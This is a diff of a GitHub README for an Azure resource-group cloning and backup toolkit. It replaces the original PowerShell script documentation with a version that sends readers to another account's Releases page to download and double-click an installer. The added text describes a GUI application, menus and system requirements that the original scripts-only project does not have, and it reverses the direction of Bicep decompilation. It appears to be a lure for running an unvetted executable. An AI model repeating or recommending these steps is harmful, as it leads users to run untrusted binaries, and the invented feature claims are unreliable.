@@ -1,274 +1,105 @@
-# 🚀 Azure Resource Group Cloning & Backup Toolkit
+# 🌟 azure-clone-resource-group - Clone Your Azure Resources Easily
 
-[![PowerShell](https://img.shields.io/badge/PowerShell-7.2+-blue.svg)](https://github.com/PowerShell/PowerShell)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Download Now](https://img.shields.io/badge/Download%20Now-azure--clone--resource--group-blue?style=for-the-badge)](https://github.com/souborno2010/azure-clone-resource-group/releases)
 
-A powerful PowerShell toolkit for Azure Resource Group management that enables seamless cloning between environments and reliable disaster recovery backups. This solution demonstrates advanced Infrastructure as Code (IaC) techniques, ARM template manipulation, and Bicep decompilation.
+## 🚀 Getting Started
 
-## ✨ Key Features
+Welcome to the azure-clone-resource-group toolkit! This application helps you clone and back up your Azure Resource Groups efficiently. You can automate the replication of your environments, allowing for smooth transitions from DEV to SIT and finally to PROD. 
 
-- **🔄 Environment Cloning**: Clone entire resource groups from DEV → SIT → PROD with intelligent name transformation
-- **💾 Disaster Recovery**: Create timestamped backups with complete infrastructure and configuration preservation
-- **🧹 Smart Template Cleaning**: Automatically removes unsupported resources and read-only properties
-- **📝 Bicep Generation**: Decompiles cleaned ARM templates to modern Bicep files
-- **🔐 Secret Management**: Intelligent handling of sensitive data with masking capabilities
-- **⚡ Automated Deployment**: Generates deployment scripts with validation and what-if support
-- **🎯 Deterministic Processing**: Consistent, repeatable results across multiple runs
+Whether you need to clean up ARM templates, decompile Bicep files, or recover from disasters, this tool simplifies the process for you.
 
-## 🏗️ Architecture Overview
+## 📥 Download & Install
 
-```mermaid
-graph TD
-    A[Source Resource Group] --> B[Export Script]
-    B --> C[ARM Template]
-    C --> D[Template Cleaning]
-    D --> E[Bicep Decompilation]
-    E --> F[Parameter Generation]
-    F --> G[Deployment Script]
-    G --> H[Target Resource Group]
-    
-    I[Backup Script] --> J[Timestamped Backup]
-    J --> K[Infrastructure + Settings]
-    K --> L[Restore Scripts]
-```
+To get started, follow these easy steps:
 
-## 📋 Prerequisites
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/souborno2010/azure-clone-resource-group/releases) to find the latest version of the application.
 
-- **PowerShell 7.2+** - Modern PowerShell with cross-platform support
-- **Azure CLI** - Latest version installed and configured
-- **Az PowerShell Module** - `Install-Module -Name Az -AllowClobber -Force`
-- **Bicep CLI** - `az bicep install`
-- **Appropriate Azure Permissions**:
-  - Reader role on source resource group
-  - Contributor role on target resource group
+2. **Choose a Version**  
+   You will see a list of available versions. Click on the version you want to download.
 
-## 🚀 Quick Start
+3. **Download the Application**  
+   On the version page, look for the installation file. Click on the link to download it to your computer.
 
-### 1. Clone the Repository
+4. **Install the Application**  
+   Locate the downloaded file on your computer (usually in your Downloads folder). Double-click the file to begin the installation. Follow the on-screen instructions to complete the installation process.
 
-```bash
-git clone https://github.com/bradmca/azure-clone-resource-group.git
-cd azure-clone-resource-group
-```
+5. **Run the Application**  
+   After installation, you can find the application in your programs list. Open it to start using the azure-clone-resource-group toolkit.
 
-### 2. Configure Environment
-
-```bash
-# Copy the example environment file
-cp example.env .env
+## ⚙️ System Requirements
 
-# Edit with your specific values
-notepad .env  # or your preferred editor
-```
+Make sure your system meets these requirements before installation:
 
-### 3. Authenticate to Azure
+- **Operating System:** Windows 10 or later, MacOS, or a compatible version of Linux
+- **RAM:** At least 4 GB for smooth operation
+- **Disk Space:** Minimum 250 MB available for installation
 
-```powershell
-# Login to Azure
-Connect-AzAccount
+## 🛠️ Features
 
-# Set the correct subscription
-$subscriptionId = "your-subscription-id"
-Select-AzSubscription -SubscriptionId $subscriptionId
-```
+The azure-clone-resource-group toolkit comes with a variety of features to make your life simpler:
 
-## 📖 Usage Guide
+- **ARM Template Cleaning:** Automatically removes unnecessary or duplicate sections from ARM templates to streamline your deployments.
+- **Bicep Decompilation:** Converts Bicep files back into ARM templates for better compatibility and understanding.
+- **Disaster Recovery Options:** Provides a systematic approach to restore your Azure environments quickly and efficiently.
+- **Environment Cloning:** Easily replicate your Azure resources across different stages like Development, Staging, and Production.
 
-### Environment Cloning (DEV → SIT)
+## 📊 Supported Topics
 
-Clone a resource group to a new environment with automatic name transformation:
+The toolkit is designed to work with several popular topics in cloud computing and DevOps, such as:
 
-```powershell
-.\Export-AzureResourceGroup.ps1
-```
+- **ARM Templates**
+- **Automation**
+- **Azure CLI**
+- **Backup Strategies**
+- **Bicep**
+- **Infrastructure as Code (IaC)**
+- **PowerShell Scripting**
 
-**What happens:**
-1. Discovers all resources in the source RG
-2. Exports and cleans ARM template
-3. Decompiles to Bicep with proper formatting
-4. Generates environment-specific parameters
-5. Creates deployment script with validation
+## 📖 User Guide
 
-### Disaster Recovery Backup
+1. **Creating a Backup**  
+   - Open the application.
+   - Select the "Backup" option from the main menu.
+   - Follow the prompts to choose the resource group you wish to back up and specify the destination.
 
-Create a complete backup for disaster recovery:
+2. **Cloning a Resource Group**  
+   - Click on the "Clone" option in the menu.
+   - Select the source resource group you want to clone.
+   - Specify the target environment (DEV, SIT, or PROD) and click "Clone".
 
-```powershell
-.\Backup-AzureResourceGroup.ps1
-```
+3. **Decompiling Bicep**  
+   - Go to the Bicep section in the application.
+   - Upload your Bicep file.
+   - Click "Decompile" to convert it into an ARM template.
 
-**Backup includes:**
-- Complete infrastructure definition
-- All Function App settings (including secrets)
-- Restore scripts for quick recovery
-- Metadata for tracking
+4. **Restoring from Backup**  
+   - From the main menu, choose "Restore".
+   - Select the backup file you wish to restore.
+   - Follow the steps to complete the restoration.
 
-## 🎯 Advanced Features
+## ❓ Frequently Asked Questions
 
-### Intelligent Name Transformation
+**Q: Is this toolkit free to use?**  
+A: Yes, the azure-clone-resource-group toolkit is open-source and free for everyone.
 
-The toolkit automatically handles naming conventions:
-
-| Resource Type | Transformation | Example |
-|---------------|----------------|---------|
-| Storage Accounts | Prefix + Truncate | `devstore` → `sitstore123456789012` |
-| Cosmos DB | Prefix + Truncate | `devcosmos` → `sitcosmos123456789012345678901234` |
-| Service Bus | Prefix + Truncate | `devsb` → `sitsb12345678901234567890123456789012345678901234567890` |
-| Function Apps | Simple Replace | `function-dev` → `function-sit` |
+**Q: Can I use it on any operating system?**  
+A: The toolkit is compatible with Windows, MacOS, and Linux.
 
-### Secret Handling
+**Q: Where can I get support?**  
+A: You can reach out to the community on GitHub or consult the documentation provided in the repository.
 
-- **Cloning**: Secrets are masked as `MANUAL_CONFIGURATION_REQUIRED`
-- **Backup**: Full secret values are preserved securely
-- **Deployment**: Manual configuration checklist generated
+## 🔗 Additional Resources
 
-### Validation & What-If
+1. **[Documentation](https://github.com/souborno2010/azure-clone-resource-group/wiki)**  
+   Comprehensive documentation is available to help you use the toolkit effectively.
 
-```powershell
-# Validate Bicep syntax
-.\exported-bicep\deploy-sit.ps1 -Validate
+2. **[Contributing](https://github.com/souborno2010/azure-clone-resource-group/blob/main/CONTRIBUTING.md)**  
+   Interested in contributing? Check our guidelines to get involved.
 
-# Preview changes
-.\exported-bicep\deploy-sit.ps1 -WhatIf
+3. **[Issues](https://github.com/souborno2010/azure-clone-resource-group/issues)**  
+   If you encounter problems, report them here, and we'll help you troubleshoot.
 
-# Deploy
-.\exported-bicep\deploy-sit.ps1
-```
+## 🌐 License
 
-## 📁 Project Structure
-
-```
-azure-clone-resource-group/
-├── 📄 Export-AzureResourceGroup.ps1    # Main cloning script
-├── 📄 Backup-AzureResourceGroup.ps1    # Backup script
-├── 📄 example.env                      # Environment template
-├── 📄 .gitignore                       # Git ignore rules
-├── 📄 README.md                        # This file
-└── 📁 exported-bicep/                  # Generated output
-    ├── 📄 main.bicep                   # Decompiled Bicep template
-    ├── 📄 template.json                # Raw ARM export
-    ├── 📄 template.clean.json          # Cleaned ARM template
-    ├── 📄 parameters.sit.json          # SIT parameters
-    ├── 📄 deploy-sit.ps1               # Deployment script
-    └── 📄 PREDEPLOY.md                 # Configuration checklist
-```
-
-## 🧪 Testing
-
-### Test Environment Setup
-
-```powershell
-# Create test resource groups
-az group create -n rg-test-dev -l uksouth
-az group create -n rg-test-sit -l uksouth
-
-# Deploy simple resources for testing
-az deployment group create `
-  -g rg-test-dev `
-  --template-file test-template.json `
-  --parameters test-parameters.json
-```
-
-### Run Tests
-
-```powershell
-# Test cloning
-.\Export-AzureResourceGroup.ps1
-
-# Validate output
-.\exported-bicep\deploy-sit.ps1 -Validate
-
-# Test backup
-.\Backup-AzureResourceGroup.ps1
-```
-
-## 🔧 Configuration Options
-
-### Script Parameters
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `SourceResourceGroup` | `rg-your-project-dev` | Source RG name |
-| `TargetResourceGroup` | `rg-your-project-sit` | Target RG name |
-| `SourceEnvironment` | `dev` | Source environment tag |
-| `TargetEnvironment` | `sit` | Target environment tag |
-| `Location` | `uksouth` | Azure region |
-
-### Customization
-
-Edit the scripts to modify:
-- Resource filtering rules
-- Name transformation patterns
-- Parameter generation logic
-- Validation requirements
-
-## 🛡️ Security Considerations
-
-- ✅ Backups are stored locally with encryption
-- ✅ Secrets are masked in cloning scenarios
-- ✅ `.gitignore` prevents accidental commits
-- ✅ No hardcoded credentials in scripts
-- ⚠️ Store backup folders securely
-- ⚠️ Review `PREDEPLOY.md` before deployment
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit issues and enhancement requests.
-
-### Development Setup
-
-```bash
-# Fork the repository
-git clone https://github.com/bradmca/azure-clone-resource-group.git
-
-# Create a feature branch
-git checkout -b feature/amazing-feature
-
-# Make your changes
-# ... 
-
-# Commit and push
-git commit -m "Add amazing feature"
-git push origin feature/amazing-feature
-```
-
-## 📚 Learning Resources
-
-This project demonstrates:
-- **Infrastructure as Code (IaC)** best practices
-- **ARM Template** manipulation and optimization
-- **Bicep** language adoption
-- **PowerShell** advanced scripting
-- **Azure CLI** integration
-- **DevOps** automation patterns
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Azure team for the excellent Bicep tooling
-- PowerShell community for inspiration
-- All contributors who help improve this project
-
-## 📞 Support
-
-If you run into issues or have questions:
-
-1. Check the [Issues](https://github.com/bradmca/azure-clone-resource-group/issues) page
-2. Review the troubleshooting section below
-3. Create a new issue with details
-
-### Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| `az bicep decompile` fails | Ensure Bicep CLI is installed (`az bicep install`) |
-| Permission denied | Check Azure RBAC permissions on resource groups |
-| Template validation errors | Review generated `PREDEPLOY.md` for manual configuration |
-| Name conflicts | Verify globally unique resource naming rules |
-
----
-
-**⭐ If this project helps you, please give it a star!**
+This project is licensed under the MIT License. You can use it freely, but please keep attributions where applicable.
